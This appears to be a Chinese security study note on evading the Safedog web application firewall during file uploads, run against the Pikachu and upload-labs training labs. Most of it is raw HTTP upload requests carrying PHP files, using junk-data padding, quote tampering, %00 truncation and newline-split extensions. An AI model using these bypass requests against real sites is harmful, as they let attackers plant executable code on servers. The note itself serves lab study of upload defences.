---
title: "网安笔记 - 文件上传模块 - WAF绕过"
category: "网安笔记"
date: 2026-04-09
published: 2026-04-09
author: "Rin"
---

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627433334141-cb693e43-53e8-4e28-80b9-b2c08e23f2f6.png?x-oss-process=image%2Fresize%2Cw_752%2Cresize%2Cw_752%2Cresize%2Cw_752)

**上传参数名解析：明确有哪些东西能修改？**

```
Content-Disposition:	一般可更改

name:	表单参数值，不能更改

filename :文件名，可以更改

Content-Type:文件MIME，视情况更改
```

**常见的绕过方法**

```
数据溢出-防匹配(xxx.. .)

符号变异-防匹配（'" ;)

数据截断-防匹配(%00 ;换行)

重复数据-防匹配(参数多次)
```

### pikachu+安全狗绕过

[https://www.cnblogs.com/shley/p/14800623.html](https://www.cnblogs.com/shley/p/14800623.html)

#### 数据溢出

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627898182231-4ded8499-dc64-45ef-bbed-2a583dafb048.png)

正常上传的情况

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627898978466-0def010f-fce2-435b-b92a-ad1e77294d14.png)

被安全狗拦截的情况

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627898889066-ba927953-805b-446e-a0c8-28a8e437dcec.png)

修改数据包上传`Content-Disposition: form-data; name="uploadfile";`中间插入大量的垃圾数据从而绕过。

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627898527403-03b55f1a-41a2-497a-a53b-61c5259b6895.png)

#### %00截断

  
`使用%00截断，添加合法后缀名`

格式：文件名.php%00.png

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627899356581-b6e5d1ad-4866-462f-a894-2b8abda1134a.png)

#### 改变符号

去掉双引号

```
POST /vul/unsafeupload/servercheck.php HTTP/1.1
Host: 10.1.1.6:88
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------276594773132894662704244861418
Content-Length: 367
Origin: http://10.1.1.6:88
Connection: close
Referer: http://10.1.1.6:88/vul/unsafeupload/servercheck.php
Cookie: PHPSESSID=e405r8e634hhjk7su64ofmjknl
Upgrade-Insecure-Requests: 1

-----------------------------276594773132894662704244861418
Content-Disposition: form-data;name="uploadfile"; filename=info4.php
Content-Type: image/jpeg

<?php phpinfo(); ?>
-----------------------------276594773132894662704244861418
Content-Disposition: form-data; name="submit"

å¼å§ä¸ä¼ 
-----------------------------276594773132894662704244861418--
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627899546378-8de44e66-4ac0-45dd-bbd1-86be5ef92dde.png)

只使用一个双引号，成功上传文件info5.php

```
POST /vul/unsafeupload/servercheck.php HTTP/1.1
Host: 10.1.1.6:88
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------276594773132894662704244861418
Content-Length: 368
Origin: http://10.1.1.6:88
Connection: close
Referer: http://10.1.1.6:88/vul/unsafeupload/servercheck.php
Cookie: PHPSESSID=e405r8e634hhjk7su64ofmjknl
Upgrade-Insecure-Requests: 1

-----------------------------276594773132894662704244861418
Content-Disposition: form-data;name="uploadfile"; filename="info5.php
Content-Type: image/jpeg

<?php phpinfo(); ?>
-----------------------------276594773132894662704244861418
Content-Disposition: form-data; name="submit"

å¼å§ä¸ä¼ 
-----------------------------276594773132894662704244861418--
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627900010071-761d120d-72a8-4d22-9aa5-53d7add3fdcf.png)

### uploads+安全狗绕过

#### 数据溢出

```
POST /Pass-06/index.php?action=show_code HTTP/1.1
Host: 10.1.1.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------219208409912899756444268510117
Content-Length: 378
Origin: http://10.1.1.6
Connection: close
Referer: http://10.1.1.6/Pass-06/index.php?action=show_code
Upgrade-Insecure-Requests: 1

-----------------------------219208409912899756444268510117
Content-Disposition: form-data; name="upload_file";填充大量的垃圾数据; filename="info.Php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
-----------------------------219208409912899756444268510117
Content-Disposition: form-data; name="submit"

涓婁紶
-----------------------------219208409912899756444268510117--
```

#### ![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627980254602-e3cf22c4-2dac-4c1d-b793-bf3728666042.png)

#### 改变符号

```
POST /Pass-02/index.php?action=show_code HTTP/1.1
Host: 10.1.1.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------156187617541967037312717027348
Content-Length: 363
Origin: http://10.1.1.6
Connection: close
Referer: http://10.1.1.6/Pass-02/index.php?action=show_code
Upgrade-Insecure-Requests: 1

-----------------------------156187617541967037312717027348
Content-Disposition: form-data; name="upload_file"; filename="info.php
Content-Type: image/jpeg

<?php phpinfo(); ?>
-----------------------------156187617541967037312717027348
Content-Disposition: form-data; name="submit"

涓婁紶
-----------------------------156187617541967037312717027348--
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627982052482-c5d7fb1b-5ee3-4df5-9fb5-5e445d91c46b.png)

```
POST /Pass-02/index.php?action=show_code HTTP/1.1
Host: 10.1.1.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------156187617541967037312717027348
Content-Length: 362
Origin: http://10.1.1.6
Connection: close
Referer: http://10.1.1.6/Pass-02/index.php?action=show_code
Upgrade-Insecure-Requests: 1

-----------------------------156187617541967037312717027348
Content-Disposition: form-data; name="upload_file"; filename=info.php
Content-Type: image/jpeg

<?php phpinfo(); ?>
-----------------------------156187617541967037312717027348
Content-Disposition: form-data; name="submit"

涓婁紶
-----------------------------156187617541967037312717027348--
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627982302049-a76640e6-9969-4c9a-9f1c-520dcc812888.png)  

#### %00截断

```
POST /Pass-02/index.php?action=show_code HTTP/1.1
Host: 10.1.1.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------156187617541967037312717027348
Content-Length: 371
Origin: http://10.1.1.6
Connection: close
Referer: http://10.1.1.6/Pass-02/index.php?action=show_code
Upgrade-Insecure-Requests: 1

-----------------------------156187617541967037312717027348
Content-Disposition: form-data; name="upload_file"; filename="info.php%00.png"
Content-Type: image/jpeg

<?php phpinfo(); ?>
-----------------------------156187617541967037312717027348
Content-Disposition: form-data; name="submit"

涓婁紶
-----------------------------156187617541967037312717027348--
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627982478279-2d122c5a-3e1b-4a16-9abe-9f27d6625309.png)

#### 换行执行

```
POST /Pass-02/index.php?action=show_code HTTP/1.1
Host: 10.1.1.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------156187617541967037312717027348
Content-Length: 368
Origin: http://10.1.1.6
Connection: close
Referer: http://10.1.1.6/Pass-02/index.php?action=show_code
Upgrade-Insecure-Requests: 1

-----------------------------156187617541967037312717027348
Content-Disposition: form-data; name="upload_file"; filename="x.
p
h
p"
Content-Type:  image/jpeg

<?php phpinfo(); ?>
-----------------------------156187617541967037312717027348
Content-Disposition: form-data; name="submit"

涓婁紶
-----------------------------156187617541967037312717027348--
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627983630181-bbbbd04f-c725-4602-ad9a-b00ed4af96e2.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627983668780-3be76f4f-6d9b-4be9-86e8-8fe85e7f63f2.png)

  

### fuzz字典

[https://github.com/fuzzdb-project/fuzzdb](https://github.com/fuzzdb-project/fuzzdb)

[https://github.com/TheKingOfDuck/fuzzDicts](https://github.com/TheKingOfDuck/fuzzDicts)

[https://github.com/TuuuNya/fuzz_dict](https://github.com/TuuuNya/fuzz_dict)

[https://github.com/jas502n/fuzz-wooyun-org](https://github.com/jas502n/fuzz-wooyun-org)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628131120768-8674e0d4-a903-4157-8880-7b5628723acf.png)![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628131140667-28bd0d61-7533-43a2-97b9-9f94a26e6358.png)![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628131148142-d724fc44-a0c7-4f7e-9871-4c49b2c665d3.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628131194773-e18311c0-8b2a-4761-8674-3e5dba51e24a.png)